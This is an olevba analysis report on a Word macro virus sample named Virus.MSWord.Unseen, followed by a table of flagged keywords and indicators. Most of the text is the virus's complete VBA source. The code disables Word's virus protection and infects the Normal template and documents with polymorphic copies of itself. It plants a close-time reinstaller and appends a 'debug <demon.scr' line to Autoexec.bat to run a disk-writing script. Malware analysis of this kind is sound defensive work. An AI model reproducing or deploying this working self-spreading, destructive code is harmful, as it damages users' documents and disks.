olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Unseen-9b4b81f37b41f5268fa4f4977cf601839cdb8027
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Unseen-9b4b81f37b41f5268fa4f4977cf601839cdb8027 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
ICheck = True
PRSWDDVQXO:          Options.VirusProtection = False
QFEHHO:          Randomize Timer
PJINRABRK:           ActInstalled = False
JVTEXSBBO:          Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
COCJDH:          Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
DNDMIXDBGS:
NCSEFPU:          NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1)
MDKFFRP:          AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1)
EPYVTAIMGWX:
SJXEXX:          If UCase(NI) = "ICHECK = TRUE" Then NormInstalled = True
GTLVMKUDNPJ:          If UCase(AI) = "ICHECK = TRUE" Then ActInstalled = True
KEHVNSE:
XUFXDXFCO:          If NormInstalled = False Then
DIAOTPT:              Set Infection = NormCarrier
SNFFNPQEG:              Set Carrier = ActCarrier
KGBUFG:          Else
GQDGXBR:              Set Infection = ActCarrier
FPDAXRGSU:              Set Carrier = NormCarrier
QOPHEKXS:          End If
ACXORCSXWH:
CFVEBOO:          If NormInstalled = True And ActInstalled = True Then
HSHEKWAAFSR:              If Int(Rnd * 24) > CInt(Hour(Time)) Then
XMBTVRUNT:              IAddressI = Int(Rnd * 9999): Open "C:\Demon.scr" For Output As #1
YWOXNWTU:              Print #1, "w " & IAddressI & " 02 01 02": Open "C:\Autoexec.bat" For Append As #2
ATRHTYWP:              Print #1, "q"
JBPEEWNJ:              Print #2, "debug <demon.scr"
CPFGMR:              Close
COMVWFYSS:              End If
AIYYDGOH:          End If
PBPGJG:
VXVHGXTDCH:          With Carrier
DHSFYUAVPKC:          UECode1 = .Lines(1, 1) & Chr(13)
JDCCBCLMOTV:          UECode2 = .Lines(2, 1) & Chr(13)
HKQPMOI:          UECode3 = .Lines(3, 1) & Chr(13)
YAOFDXXF:          UECode = UECode1 & UECode2 & UECode3
FQMFGS:          For X = 5 To .CountOfLines - 1
QSHTNQCRXAK:              VCCode = .Lines(X, 1)
NFDUEAATV:              If VCCode = "End Sub" Then Exit For
HNXINGRSS:              For I = 1 To 20
TYMDLUVXOUV:                  If Mid(VCCode, I, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - I)
EHVSCARXAGG:              Next I
MMLFSTFP:              factor = ""
QTOHLGMQOQI:              For Y = 1 To Int(Rnd * 6) + 6
DQSETFS:                  factor = factor & Chr(Int(Rnd * 25) + 65)
BXGFNALFQ:              Next Y
QIMSFYXM:              make_morph = factor & ": "
OCKCWXRGUD:
EHHMRKF:              VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
YCSHNNHAAIM:          Next X
MRDUETBCWL:          VirCode = UECode & VirCode & "End Sub"
MIGGCFOITVF:          End With
FUWVJAI:
ABMNNOWS:          With Infection
DKROFG:              .DeleteLines 1, .CountOfLines
XKCQGBN:              .InsertLines 1, VirCode
FXUXJGVB:          End With
YIYFIDGQN:
LEUHNDS:          StealthModul = "by Lord Arz"
YAQXONMT:          ResetMe = "Private Sub Document_Close()" & Chr(13)
RTVORVPI:          ResetMe = ResetMe & "Beginn:                                                                                                                                                                                                                                                        If ShowVisualBasicEditor = True Then Normal.ThisDocument.Variables(" & Chr(34) & "VCode" & Chr(34) & ").Value = (" & Chr(34) & "Msgbox " & Chr(34) & Chr(34) & "Seven deadly sins, seven ways to win, seven holy path to hell, seven downward slopes, seven blodied hopes, seven are your burnig fires, seven your desires...." & Chr(34) & ")" & Chr(13)
NKWEQDXWG:          ResetMe = ResetMe & "With ThisDocument.VBProject.VBComponents(1).CodeModule" & Chr(13)
JUTTASR:          ResetMe = ResetMe & ".DeleteLines 1, .CountOfLines" & Chr(13)
AGABUAO:          ResetMe = ResetMe & ".InsertLines 1, ThisDocument.Variables(1).Value" & Chr(13)
IIFTIC:          ResetMe = ResetMe & "End With" & Chr(13)
QYQXQV:          ResetMe = ResetMe & "ThisDocument.Save" & Chr(13)
LWCFBTQB:          ResetMe = ResetMe & "End Sub"
PAOAEE:
SSPSNFTOFSS:          For X = 1 To ThisDocument.Variables.Count
AECLNHYK:          DoEvents
SPQCRW:              ThisDocument.Variables(X).Delete
BMEEGLPAJ:          Next X
KQUOMIJ:
IOMHGP:          With ActCarrier
PJEFSKHM:              .DeleteLines 1, .CountOfLines
YWBMUN:              .InsertLines 1, ResetMe
KMJUFXNFQEO:          End With
EPGHGEMYEYU:
NEODAXB:          With NormCarrier
WFVMQWG:              .DeleteLines 1, .CountOfLines
PFYKSOX:              .InsertLines 1, ResetMe
RJULJDHYBKQ:          End With
LJQJGFLW:
IGOAFLRPXW:          DoEvents
PUQFYJMTOF:
FJRIEYLO:          ActiveDocument.Variables.Add "VCode", VirCode
FHUKCIQDFKS:          Normal.ThisDocument.Variables.Add "VCode", VirCode
VQPYANC:
GUVXSBFRX:          ActiveDocument.Save
KGGPOTU:          NormalTemplate.Save
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|IOC       |Demon.scr           |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |demon.scr           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

